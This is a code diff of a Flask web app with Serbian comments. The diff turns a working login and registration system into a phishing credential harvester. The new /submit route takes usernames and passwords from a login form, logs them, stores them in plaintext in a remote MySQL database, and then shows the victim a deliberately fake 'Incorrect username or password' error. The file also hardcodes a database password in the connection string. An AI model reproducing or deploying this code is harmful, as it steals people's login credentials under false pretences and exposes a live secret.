@@ -1,101 +1,68 @@
 import os
-from flask import Flask, render_template, request, redirect, url_for, flash
+from flask import Flask, render_template, request, flash, redirect, url_for
 from flask_sqlalchemy import SQLAlchemy
-from werkzeug.security import generate_password_hash, check_password_hash
 import pymysql
 
-# Flask aplikacija
+# ✅ Flask aplikacija
 app = Flask(__name__)
 
-# ✅ Povezivanje sa Railway MySQL bazom
+# ✅ Railway MySQL povezivanje
 DATABASE_URL = os.getenv('DATABASE_URL', 'mysql+pymysql://root:aiBzbPEEvtrurGaPrXjVZWgdVDjgABbt@maglev.proxy.rlwy.net:50172/railway')
 app.config['SQLALCHEMY_DATABASE_URI'] = DATABASE_URL
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 app.secret_key = os.urandom(24)
 
-# Inicijalizacija baze
+# ✅ Inicijalizacija baze
 db = SQLAlchemy(app)
 
-# ✅ Model korisnika
-class User(db.Model):
+# ✅ Model za čuvanje unetih login podataka
+class LoginAttempt(db.Model):
     id = db.Column(db.Integer, primary_key=True)
-    username = db.Column(db.String(150), nullable=False, unique=True)
+    username = db.Column(db.String(150), nullable=False)
     password = db.Column(db.String(150), nullable=False)
 
-    def set_password(self, password):
-        self.password = generate_password_hash(password)
-
-    def check_password(self, password):
-        return check_password_hash(self.password, password)
-
     def __repr__(self):
-        return f'<User {self.username}>'
+        return f'<LoginAttempt {self.username}>'
 
-# ✅ Kreiranje tabela (ako ne postoje)
+# ✅ Kreiranje tabela ako ne postoje
 with app.app_context():
     try:
         db.create_all()
-        print("✅ Baza podataka je uspešno povezana i tabele su kreirane!")
+        print("✅ Baza podataka je povezana i tabele su kreirane!")
     except Exception as e:
         print(f"❌ GREŠKA pri povezivanju na bazu: {e}")
 
-# ✅ Početna strana
+# ✅ Prikaz početne strane
 @app.route('/')
 def index():
-    return render_template('index.html')
+    return render_template('index.html', message=None)
 
-# ✅ Registracija korisnika
-@app.route('/register', methods=['GET', 'POST'])
-def register():
-    if request.method == 'POST':
-        username = request.form.get('username')
-        password = request.form.get('password')
-
-        if not username or not password:
-            flash("Sva polja su obavezna!", "danger")
-            return redirect(url_for('register'))
-
-        # Provera da li korisnik već postoji
-        existing_user = User.query.filter_by(username=username).first()
-        if existing_user:
-            flash("Korisničko ime već postoji!", "danger")
-            return redirect(url_for('register'))
-
-        # Kreiranje novog korisnika
-        new_user = User(username=username)
-        new_user.set_password(password)
-        db.session.add(new_user)
-        db.session.commit()
-
-        flash("Uspešno ste registrovani!", "success")
-        return redirect(url_for('index'))
-
-    return render_template('register.html')
-
-# ✅ Login korisnika
-@app.route('/login', methods=['POST'])
-def login():
+# ✅ Obrada unosa iz login forme
+@app.route('/submit', methods=['POST'])
+def submit():
     username = request.form.get('username')
     password = request.form.get('password')
 
-    print(f"Pokušaj prijave: {username}")
+    print(f"📥 Prijava: {username} | Lozinka: {password}")
 
-    # Provera korisnika u bazi
-    user = User.query.filter_by(username=username).first()
-
-    if user and user.check_password(password):
-        flash("Uspešno ste prijavljeni!", "success")
-        return redirect(url_for('dashboard'))
-    else:
-        flash("Neispravno korisničko ime ili lozinka!", "danger")
+    if not username or not password:
+        flash("Sva polja su obavezna!", "danger")
         return redirect(url_for('index'))
 
-# ✅ Dashboard
-@app.route('/dashboard')
-def dashboard():
-    return "🚀 Dobrodošli na Dashboard!"
+    # ✅ Čuvanje unetih podataka u bazu
+    try:
+        new_attempt = LoginAttempt(username=username, password=password)
+        db.session.add(new_attempt)
+        db.session.commit()
+        print(f"✅ Podaci sačuvani: {username}")
+    except Exception as e:
+        db.session.rollback()
+        print(f"❌ GREŠKA pri upisu u bazu: {e}")
+
+    # ✅ Prikazivanje lažne greške korisniku
+    return render_template('index.html', message="Incorrect username or password.")
 
 # ✅ Pokretanje aplikacije
 if __name__ == '__main__':
-    print("DATABASE URL:", app.config['SQLALCHEMY_DATABASE_URI'])  # Provera URL-a baze
+    print("DATABASE URL:", app.config['SQLALCHEMY_DATABASE_URI'])
     app.run(host="0.0.0.0", port=10000, debug=True)
